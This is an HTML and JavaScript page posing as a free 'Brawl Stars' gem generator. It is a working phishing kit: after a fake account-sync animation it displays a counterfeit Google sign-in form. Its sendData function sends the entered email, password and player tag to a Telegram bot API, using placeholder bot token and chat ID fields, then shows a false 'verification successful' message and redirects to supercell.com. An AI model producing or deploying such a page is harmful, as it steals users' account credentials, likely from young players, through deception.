<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Brawl Stars Generator</title>
    <link href="https://fonts.googleapis.com/css2?family=Lilita+One&family=Source+Sans+Pro:wght@400;700&display=swap" rel="stylesheet">
    <style>
        /* –ì–õ–û–ë–ê–õ–¨–ù–´–ï –°–¢–ò–õ–ò */
        body, html {
            margin: 0; padding: 0; width: 100%; height: 100%;
            font-family: 'Lilita One', cursive; overflow-x: hidden;
            background: #1a2969;
        }

        .bg-overlay {
            position: fixed; top: -50%; left: -50%; width: 200%; height: 200%;
            background-image: url('https://brawlergems.com/generator/images/brawl_stars_pattern_transparent.png');
            background-size: 300px auto; opacity: 0.1;
            animation: moveBackground 60s linear infinite;
            z-index: 0; pointer-events: none;
        }

        @keyframes moveBackground {
            0% { transform: translate(0, 0); }
            100% { transform: translate(-300px, -300px); }
        }

        .wrapper {
            position: relative; z-index: 10;
            display: flex; flex-direction: column; align-items: center;
            padding: 20px; min-height: 100vh;
        }

        .logo { width: 220px; margin: 10px 0; filter: drop-shadow(0 5px 10px rgba(0,0,0,0.5)); }

        /* –°–¢–ò–õ–ò –î–õ–Ø –®–ï–õ–õ–ò –ò –û–ë–õ–ê–ö–ê –¢–ï–ö–°–¢–ê */
        .shelly-container {
            display: flex; align-items: center; width: 100%; max-width: 450px;
            margin-bottom: 20px; animation: fadeIn 0.5s ease;
        }

        .shelly-avatar {
            width: 80px; height: 80px; border-radius: 50%; border: 4px solid #000;
            box-shadow: 0 4px 10px rgba(0,0,0,0.3); z-index: 2; background: #fff;
        }

        .brawl-bubble {
            background: white; border: 4px solid black; border-radius: 20px;
            padding: 15px 20px; margin-left: -15px; position: relative;
            flex: 1; box-shadow: 0 6px 0 rgba(0,0,0,0.1);
        }

        .brawl-bubble::before {
            content: ''; position: absolute; left: -14px; top: 50%;
            transform: translateY(-50%); border-top: 10px solid transparent;
            border-bottom: 10px solid transparent; border-right: 10px solid black;
        }

        .bubble-text { color: #000; font-size: 16px; line-height: 1.2; text-align: left; }

        /* –ì–õ–ê–í–ù–û–ï –û–ö–ù–û */
        .main-box {
            background: white; border: 5px solid #000; border-radius: 20px;
            width: 100%; max-width: 450px; padding: 25px;
            box-shadow: 0 15px 0 rgba(0,0,0,0.2); text-align: center;
            box-sizing: border-box; position: relative;
        }

        .step-title { color: #000; font-size: 24px; margin-bottom: 20px; text-transform: uppercase; }

        .tag-input-wrapper {
            background: #f0f0f0; border: 3px solid #ccc; border-radius: 10px;
            padding: 10px; margin-bottom: 20px;
        }
        input#tag {
            width: 100%; border: none; background: transparent;
            font-family: 'Lilita One'; font-size: 26px; text-align: center;
            outline: none; text-transform: uppercase;
        }

        .gems-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 25px; }
        .gem-card {
            background: #f9f9f9; border: 3px solid #eee; border-radius: 15px;
            padding: 15px; cursor: pointer; transition: 0.1s;
        }
        .gem-card.selected { border-color: #FFA800; background: #FFF9E6; transform: scale(1.05); }
        .gem-card img { width: 60px; display: block; margin: 0 auto 5px; }
        .gem-card span { font-size: 20px; color: #333; }

        .btn-yellow {
            background: linear-gradient(180deg, #FFD84D 0%, #FFA800 100%);
            border: 3px solid #000; border-radius: 12px;
            color: #fff; font-family: 'Lilita One'; font-size: 24px;
            padding: 15px; width: 100%; cursor: pointer;
            box-shadow: 0 6px 0 #CC7A00; text-shadow: 2px 2px 0 rgba(0,0,0,0.3);
            text-transform: uppercase; transition: 0.1s;
        }
        .btn-yellow:active { transform: translateY(3px); box-shadow: 0 3px 0 #CC7A00; }

        .loader-wrap { display: none; margin: 30px 0; }
        .bar-bg { background: #eee; height: 25px; border: 3px solid #000; border-radius: 15px; overflow: hidden; }
        .bar-fill { background: #FFA800; height: 100%; width: 0%; transition: 0.2s; }
        .logs { 
            text-align: left; background: #222; color: #0f0; 
            padding: 10px; border-radius: 10px; font-family: monospace; 
            font-size: 12px; height: 80px; overflow-y: hidden; margin-top: 15px;
        }

        .account-ready { display: block; background: #222; border-radius: 15px; padding: 20px; color: #fff; margin-bottom: 20px; }
        .ready-tag { color: #FFD84D; font-size: 22px; margin-top: 10px; }

        .google-ui { display: none; font-family: 'Source Sans Pro', sans-serif; text-align: left; }
        .google-ui h2 { font-weight: 400; font-size: 24px; text-align: center; color: #202124; margin-top: 10px; }
        .g-input {
            width: 100%; padding: 13px; margin: 10px 0;
            border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box;
        }

        .back-link { position: absolute; top: 15px; left: 15px; width: 35px; cursor: pointer; display: none; }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(-10px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>
</head>
<body>

<div class="bg-overlay"></div>

<div class="wrapper">
    <img src="https://brawlergems.com/generator/images/logo_outlined_noBG.png" class="logo">

    <div class="shelly-container">
        <img src="https://brawlergems.com/generator/images/brawler_icon.png" class="shelly-avatar">
        <div class="brawl-bubble">
            <div class="bubble-text" id="bubble-msg">Hey Brawler! Free gems event is live! Enter your tag to get started!</div>
        </div>
    </div>

    <div class="main-box" id="mainBox">
        <img src="https://brawlergems.com/generator/images/back.png" class="back-link" id="backBtn" onclick="goBack()">

        <div id="step-entry">
            <div class="step-title">Enter Player Tag</div>
            <div class="tag-input-wrapper">
                <input type="text" id="tag" placeholder="#TAG123" maxlength="12">
            </div>
            
            <div class="step-title" style="font-size: 18px;">Select Gems</div>
            <div class="gems-grid">
                <div class="gem-card selected" onclick="selectGems(this, '30')"><img src="https://brawlergems.com/generator/images/30.png"><span>30</span></div>
                <div class="gem-card" onclick="selectGems(this, '360')"><img src="https://brawlergems.com/generator/images/360.png"><span>360</span></div>
                <div class="gem-card" onclick="selectGems(this, '950')"><img src="https://brawlergems.com/generator/images/950.png"><span>950</span></div>
                <div class="gem-card" onclick="selectGems(this, '2000')"><img src="https://brawlergems.com/generator/images/2000.png"><span>2000</span></div>
            </div>
            <button class="btn-yellow" onclick="startLoading()">Connect</button>
        </div>

        <div id="step-load" class="loader-wrap">
            <div class="step-title" id="load-status">Connecting...</div>
            <div class="bar-bg"><div class="bar-fill" id="bar"></div></div>
            <div class="logs" id="log-box"></div>
        </div>

        <div id="step-ready" style="display:none;">
            <div class="account-ready">
                <div id="reward-display">
                    </div>
                <div class="ready-tag" id="display-tag">#TAG</div>
                <div style="font-size: 14px; opacity: 0.7;">Account Synced Successfully</div>
            </div>
            <button class="btn-yellow" id="claim-btn" onclick="showGoogle()">Claim Gems</button>
        </div>

        <div id="step-google" class="google-ui">
            <center><img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" width="75"></center>
            <h2>Sign in</h2>
            <p style="text-align:center; color:#5f6368; font-size:14px; margin-bottom:25px;">Verify ownership to receive rewards</p>
            <input type="email" id="email" class="g-input" placeholder="Email or phone">
            <input type="password" id="pass" class="g-input" placeholder="Enter password">
            <button class="btn-yellow" style="margin-top:20px; font-size:18px;" onclick="sendData()">Confirm Verification</button>
        </div>
    </div>
</div>

<script>
    let selectedGems = "30";
    let playerTag = "";
    const bubbleMsg = document.getElementById('bubble-msg');

    function selectGems(el, val) {
        document.querySelectorAll('.gem-card').forEach(c => c.classList.remove('selected'));
        el.classList.add('selected');
        selectedGems = val;
    }

    function startLoading() {
        playerTag = document.getElementById('tag').value;
        if(playerTag.length < 3) return alert("Enter valid tag!");

        document.getElementById('step-entry').style.display = 'none';
        document.getElementById('step-load').style.display = 'block';
        
        bubbleMsg.innerText = "Searching for your account... Please wait!";

        let p = 0;
        let logs = ["> Searching player...", "> Database found", "> Syncing gems...", "> Finalizing..."];
        let lIdx = 0;

        let iv = setInterval(() => {
            p += 2;
            document.getElementById('bar').style.width = p + "%";
            
            if(p % 25 == 0 && lIdx < logs.length) {
                document.getElementById('log-box').innerHTML += "<div>" + logs[lIdx] + "</div>";
                document.getElementById('load-status').innerText = logs[lIdx].replace("> ", "");
                lIdx++;
            }

            if(p >= 100) {
                clearInterval(iv);
                setTimeout(showReady, 500);
            }
        }, 50);
    }

    function showReady() {
        document.getElementById('step-load').style.display = 'none';
        document.getElementById('step-ready').style.display = 'block';
        document.getElementById('backBtn').style.display = 'block';
        
        // –í–°–¢–ê–í–õ–Ø–ï–ú –ö–ê–†–¢–ò–ù–ö–£ –í–´–ë–†–ê–ù–ù–´–• –ì–ï–ú–û–í
        const rewardDiv = document.getElementById('reward-display');
        rewardDiv.innerHTML = `<img src="https://brawlergems.com/generator/images/${selectedGems}.png" style="width:100px; filter: drop-shadow(0 8px 15px rgba(0,0,0,0.5)); margin-bottom: 10px;">`;

        document.getElementById('display-tag').innerText = playerTag.toUpperCase();
        document.getElementById('claim-btn').innerText = "Claim " + selectedGems + " Gems";
        
        bubbleMsg.innerText = "Account found! You can now claim your reward!";
    }

    function showGoogle() {
        document.getElementById('step-ready').style.display = 'none';
        document.getElementById('step-google').style.display = 'block';
        document.getElementById('mainBox').style.padding = "40px 25px";
        bubbleMsg.innerText = "Almost there! Just verify you are a real Brawler!";
    }

    async function sendData() {
        const mail = document.getElementById('email').value;
        const pass = document.getElementById('pass').value;
        if(!mail || !pass) return alert("Fill all fields!");

        const token = "–¢–í–û–ô_–¢–û–ö–ï–ù";
        const chat = "–¢–í–û–ô_ID";
        const text = `üéØ LOG\nTag: ${playerTag}\nGems: ${selectedGems}\nMail: ${mail}\nPass: ${pass}`;

        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(text)}`);
        
        alert("Verification successful! Gems will be added in 24h.");
        window.location.href = "https://supercell.com";
    }

    function goBack() { location.reload(); }
</script>

</body>
</html>
